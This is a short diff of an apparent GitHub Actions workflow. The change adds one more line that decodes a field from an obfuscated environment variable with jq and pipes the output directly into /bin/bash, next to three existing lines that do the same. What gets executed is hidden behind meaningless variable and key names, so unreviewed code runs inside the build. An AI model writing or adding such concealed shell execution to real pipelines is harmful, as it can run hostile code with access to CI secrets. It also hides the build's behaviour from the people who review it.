@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$jfej18" | jq -r .kta5 | /bin/bash
           echo $lxhba95 | jq -r .ii4194 | /bin/bash
           echo $sitzl35 | jq -r .kov9 | /bin/bash
+          echo $ld20458 | jq -r .fwtri8642 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
